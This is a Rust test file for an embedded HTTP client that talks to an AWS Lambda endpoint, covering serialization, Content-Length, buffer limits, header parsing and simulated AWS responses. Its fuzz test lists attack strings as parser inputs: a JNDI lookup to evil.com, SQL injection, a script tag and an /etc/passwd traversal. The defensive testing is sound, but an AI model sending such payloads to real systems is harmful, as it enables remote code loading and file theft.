use crate::models::uplink::UplinkMessage;
use crate::network::http::{parse_response, post_request};
use heapless::String as HString;
use serde::Serialize;

fn make_msg(id: &str, current: i32) -> UplinkMessage {
    UplinkMessage {
        id: id.try_into().unwrap(),
        current,
    }
}

// ════════════════════════════════════════════════════════════════
// GAP 1: Serialization failure fallback
// ════════════════════════════════════════════════════════════════

/// Payload that exceeds the 256-byte serde_json_core serialization buffer
#[derive(Serialize)]
struct OversizedPayload {
    data: HString<300>,
}

#[test]
fn post_serialization_failure_produces_empty_body() {
    let payload = OversizedPayload {
        data: core::iter::repeat_n('X', 300).collect(),
    };
    let req = post_request("h", &payload, Some("/")).unwrap();
    // When serialization fails, post_request falls back to Content-Length: 0
    assert!(req.contains("Content-Length: 0"));
    // Body should be empty (nothing after \r\n\r\n)
    let body_start = req.as_str().find("\r\n\r\n").unwrap() + 4;
    assert_eq!(&req.as_str()[body_start..], "");
}

// ════════════════════════════════════════════════════════════════
// GAP 2: Content-Length digit conversion
// ════════════════════════════════════════════════════════════════

#[test]
fn post_content_length_single_digit() {
    // {"id":"a","current":0} = 21 chars = two digits
    let req = post_request("h", &make_msg("a", 0), Some("/")).unwrap();
    let s = req.as_str();
    let cl_prefix = "Content-Length: ";
    let cl_start = s.find(cl_prefix).unwrap() + cl_prefix.len();
    let cl_end = s[cl_start..].find("\r\n").unwrap() + cl_start;
    let cl_str = &s[cl_start..cl_end];
    let cl_val: usize = cl_str.parse().unwrap();
    // Verify the Content-Length matches the actual body
    let body_start = s.find("\r\n\r\n").unwrap() + 4;
    assert_eq!(cl_val, s[body_start..].len());
}

#[test]
fn post_content_length_three_digits() {
    // Use max-length id to get a body > 99 bytes
    let long_id: HString<64> = core::iter::repeat_n('Z', 64).collect();
    let msg = UplinkMessage {
        id: long_id,
        current: i32::MAX,
    };
    let req = post_request("h", &msg, Some("/")).unwrap();
    let s = req.as_str();
    let cl_prefix = "Content-Length: ";
    let cl_start = s.find(cl_prefix).unwrap() + cl_prefix.len();
    let cl_end = s[cl_start..].find("\r\n").unwrap() + cl_start;
    let cl_val: usize = s[cl_start..cl_end].parse().unwrap();
    // Verify accuracy against actual body
    let body_start = s.find("\r\n\r\n").unwrap() + 4;
    assert_eq!(cl_val, s[body_start..].len());
    // With 64-char id, Content-Length should be multi-digit
    assert!(cl_val > 9);
}

// ════════════════════════════════════════════════════════════════
// GAP 3: Buffer overflow returns Err instead of panicking
// ════════════════════════════════════════════════════════════════

#[test]
fn get_request_overflows_with_very_long_host() {
    let long_host: HString<400> = core::iter::repeat_n('h', 400).collect();
    assert!(crate::network::http::get_request(long_host.as_str(), Some("/")).is_err());
}

#[test]
fn get_request_overflows_with_very_long_path() {
    let long_path: HString<400> = core::iter::repeat_n('/', 400).collect();
    assert!(crate::network::http::get_request("h", Some(long_path.as_str())).is_err());
}

// ════════════════════════════════════════════════════════════════
// GAP 4: Serde rename verification
// ════════════════════════════════════════════════════════════════

#[test]
fn serde_rename_wire_format_deserializes() {
    // Wire format uses hyphenated keys
    let json = concat!(
        r#"{"x-amzn-RequestId":"r","x-amz-apigw-id":"g","#,
        r#""X-Amzn-Trace-Id":"t","content-type":"c","#,
        r#""content-length":"1","date":"d","body":"b"}"#
    );
    let (resp, _): (crate::models::uplink::LambdaResponse, _) =
        serde_json_core::from_str(json).unwrap();
    assert_eq!(resp.x_amzn_request_id.as_str(), "r");
    assert_eq!(resp.x_amz_apigw_id.as_str(), "g");
    assert_eq!(resp.x_amzn_trace_id.as_str(), "t");
}

#[test]
fn serde_rename_serialized_output_uses_wire_keys() {
    let resp = crate::models::uplink::LambdaResponse {
        x_amzn_request_id: "r".try_into().unwrap(),
        x_amz_apigw_id: "g".try_into().unwrap(),
        x_amzn_trace_id: "t".try_into().unwrap(),
        content_type: "c".try_into().unwrap(),
        content_length: "1".try_into().unwrap(),
        date: "d".try_into().unwrap(),
        body: "b".try_into().unwrap(),
    };
    let json: HString<512> = serde_json_core::to_string(&resp).unwrap();
    // Should NOT contain rust field names
    assert!(!json.contains("x_amzn_request_id"));
    assert!(!json.contains("x_amz_apigw_id"));
    assert!(!json.contains("x_amzn_trace_id"));
    // Should contain wire-format keys
    assert!(json.contains("x-amzn-RequestId"));
    assert!(json.contains("x-amz-apigw-id"));
    assert!(json.contains("X-Amzn-Trace-Id"));
}

#[test]
fn serde_rename_rust_field_names_rejected() {
    // Using Rust field names instead of wire-format should fail
    let json = r#"{"x_amzn_request_id":"r","x_amz_apigw_id":"g","x_amzn_trace_id":"t","content_type":"c","content_length":"1","date":"d","body":"b"}"#;
    let result: Result<(crate::models::uplink::LambdaResponse, usize), _> =
        serde_json_core::from_str(json);
    // Some fields don't have renames (date, body) so partial success possible,
    // but the renamed fields should be empty
    if let Ok((resp, _)) = result {
        assert!(resp.x_amzn_request_id.is_empty());
        assert!(resp.x_amz_apigw_id.is_empty());
        assert!(resp.x_amzn_trace_id.is_empty());
    }
}

// ════════════════════════════════════════════════════════════════
// GAP 5: Adversarial / fuzz battery
// ════════════════════════════════════════════════════════════════

#[test]
fn parse_adversarial_strings_do_not_crash() {
    let adversarial = [
        "HTTP/1.1 200 OK\r\n\r\n' OR 1=1 --",
        "HTTP/1.1 200 OK\r\n\r\n<script>alert(1)</script>",
        "HTTP/1.1 200 OK\r\n\r\n\0\0\0",
        "HTTP/1.1 200 OK\r\n\r\n\r\r\n\n\r\n\r\n",
        "HTTP/1.1 200 OK\r\n\r\n%00%0a%0d",
        "HTTP/1.1 200 OK\r\n\r\n../../../../etc/passwd",
        "HTTP/1.1 200 OK\r\n\r\n${jndi:ldap://evil.com/a}",
        "HTTP/1.1 200 OK\r\nContent-Type: \r\n\r\n",
        "HTTP/1.1 200 OK\r\n: empty-key\r\n\r\n",
        "\r\n\r\n",
        "\n",
        "HTTP",
        "HTTP/",
        "HTTP/1.1",
        "HTTP/1.1 ",
        "HTTP/1.1 200",
        "HTTP/1.1 200 OK",
    ];
    for input in &adversarial {
        // Must not panic — errors are acceptable
        let _ = parse_response(input);
    }
}

#[test]
fn parse_large_garbage_body() {
    let garbage: HString<1024> = core::iter::repeat_n('!', 1024).collect();
    let mut raw = HString::<1100>::new();
    raw.push_str("HTTP/1.1 200 OK\r\n\r\n").unwrap();
    raw.push_str(garbage.as_str()).unwrap();
    let resp = parse_response(raw.as_str()).unwrap();
    assert_eq!(resp.body.len(), 1024);
}

#[test]
fn parse_null_bytes_in_header_value() {
    let raw = "HTTP/1.1 200 OK\r\nContent-Type: text\0/plain\r\n\r\n";
    // Should not crash — null bytes are just characters
    let resp = parse_response(raw);
    assert!(resp.is_ok());
}

#[test]
fn parse_repeated_separators() {
    let raw = "HTTP/1.1 200 OK\r\n\r\n\r\n\r\n\r\n";
    let resp = parse_response(raw).unwrap();
    // After the blank line separator, remaining \r\n pairs become body lines
    // .lines() will produce empty strings joined by \n
    let _ = resp.body;
}

#[test]
fn parse_tab_in_header_value() {
    let raw = "HTTP/1.1 200 OK\r\nContent-Type:\tapplication/json\r\n\r\n";
    let resp = parse_response(raw).unwrap();
    // trim() removes tabs too
    assert_eq!(resp.content_type.as_str(), "application/json");
}

// ════════════════════════════════════════════════════════════════
// GAP 6: CRLF handling in body
// ════════════════════════════════════════════════════════════════

#[test]
fn parse_crlf_body_becomes_lf() {
    // Body with CRLF line endings — .lines() consumes \r\n, reassembly uses \n
    let raw = "HTTP/1.1 200 OK\r\n\r\nline1\r\nline2";
    let resp = parse_response(raw).unwrap();
    assert!(resp.body.contains("line1"));
    assert!(resp.body.contains("line2"));
    // After .lines() + join with \n, should have \n not \r\n
    assert!(resp.body.contains('\n'));
}

#[test]
fn parse_lf_body_stays_lf() {
    let raw = "HTTP/1.1 200 OK\r\n\r\nline1\nline2";
    let resp = parse_response(raw).unwrap();
    assert!(resp.body.contains("line1\nline2"));
}

#[test]
fn parse_single_line_body_no_trailing_newline() {
    let raw = "HTTP/1.1 200 OK\r\n\r\nsingle";
    let resp = parse_response(raw).unwrap();
    assert_eq!(resp.body.as_str(), "single");
}

// ════════════════════════════════════════════════════════════════
// GAP 7: Realistic AWS Lambda response simulations
// ════════════════════════════════════════════════════════════════

#[test]
fn aws_200_post_response() {
    let raw = concat!(
        "HTTP/1.1 200 OK\r\n",
        "Date: Thu, 27 Feb 2025 19:30:00 GMT\r\n",
        "Content-Type: application/json\r\n",
        "Content-Length: 49\r\n",
        "Connection: keep-alive\r\n",
        "x-amzn-RequestId: a1b2c3d4-e5f6-7890-abcd-ef1234567890\r\n",
        "x-amz-apigw-id: AbCdEfGhIjKlMnOpQr\r\n",
        "X-Amzn-Trace-Id: Root=1-65e04f18-abcdef0123456789abcdef01\r\n",
        "X-Amz-Cf-Pop: DFW56-P2\r\n",
        "X-Amz-Cf-Id: abc123==\r\n",
        "\r\n",
        r#"{"message":"Uplink received","id":"device-001"}"#,
    );
    let resp = parse_response(raw).unwrap();
    assert_eq!(
        resp.x_amzn_request_id.as_str(),
        "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
    );
    assert_eq!(resp.x_amz_apigw_id.as_str(), "AbCdEfGhIjKlMnOpQr");
    assert!(resp.x_amzn_trace_id.starts_with("Root=1-"));
    assert_eq!(resp.content_type.as_str(), "application/json");
    assert_eq!(resp.content_length.as_str(), "49");
    assert!(resp.body.contains("Uplink received"));
}

#[test]
fn aws_200_get_response() {
    let raw = concat!(
        "HTTP/1.1 200 OK\r\n",
        "Date: Thu, 27 Feb 2025 19:30:00 GMT\r\n",
        "Content-Type: application/json\r\n",
        "Content-Length: 36\r\n",
        "x-amzn-RequestId: 99999999-8888-7777-6666-555555555555\r\n",
        "x-amz-apigw-id: ZzYyXxWwVvUuTt\r\n",
        "X-Amzn-Trace-Id: Root=1-aabbccdd-112233445566778899001122\r\n",
        "\r\n",
        r#"{"message":"Hello from Supervictor!"}"#,
    );
    let resp = parse_response(raw).unwrap();
    assert!(resp.body.contains("Hello from Supervictor!"));
    assert_eq!(resp.content_type.as_str(), "application/json");
}

#[test]
fn aws_422_unprocessable_entity() {
    let raw = concat!(
        "HTTP/1.1 422 Unprocessable Entity\r\n",
        "Date: Thu, 27 Feb 2025 19:30:00 GMT\r\n",
        "Content-Type: application/json\r\n",
        "Content-Length: 67\r\n",
        "x-amzn-RequestId: err-req-id-001\r\n",
        "\r\n",
        r#"{"detail":[{"msg":"field required","type":"value_error.missing"}]}"#,
    );
    let resp = parse_response(raw).unwrap();
    assert!(resp.body.contains("field required"));
    assert_eq!(resp.x_amzn_request_id.as_str(), "err-req-id-001");
}

#[test]
fn aws_403_forbidden_mtls_rejection() {
    let raw = concat!(
        "HTTP/1.1 403 Forbidden\r\n",
        "Content-Type: application/json\r\n",
        "Content-Length: 23\r\n",
        "x-amzn-RequestId: 00000000-0000-0000-0000-000000000000\r\n",
        "x-amzn-ErrorType: AccessDeniedException\r\n",
        "\r\n",
        r#"{"message":"Forbidden"}"#,
    );
    let resp = parse_response(raw).unwrap();
    assert!(resp.body.contains("Forbidden"));
    assert_eq!(
        resp.x_amzn_request_id.as_str(),
        "00000000-0000-0000-0000-000000000000"
    );
}

#[test]
fn aws_502_bad_gateway_lambda_timeout() {
    let raw = concat!(
        "HTTP/1.1 502 Bad Gateway\r\n",
        "Content-Type: application/json\r\n",
        "Content-Length: 36\r\n",
        "\r\n",
        r#"{"message":"Internal server error"}"#,
    );
    let resp = parse_response(raw).unwrap();
    assert!(resp.body.contains("Internal server error"));
}

#[test]
fn aws_429_too_many_requests_throttled() {
    let raw = concat!(
        "HTTP/1.1 429 Too Many Requests\r\n",
        "Content-Type: application/json\r\n",
        "Content-Length: 30\r\n",
        "Retry-After: 1\r\n",
        "\r\n",
        r#"{"message":"Too Many Requests"}"#,
    );
    let resp = parse_response(raw).unwrap();
    assert!(resp.body.contains("Too Many Requests"));
    // Retry-After is not a tracked header — should be ignored
    assert!(resp.date.is_empty());
}

#[test]
fn aws_multiline_pretty_json_body() {
    let raw = concat!(
        "HTTP/1.1 200 OK\r\n",
        "Content-Type: application/json\r\n",
        "\r\n",
        "{\r\n",
        "  \"message\": \"ok\",\r\n",
        "  \"count\": 1\r\n",
        "}",
    );
    let resp = parse_response(raw).unwrap();
    assert!(resp.body.contains("message"));
    assert!(resp.body.contains("count"));
}
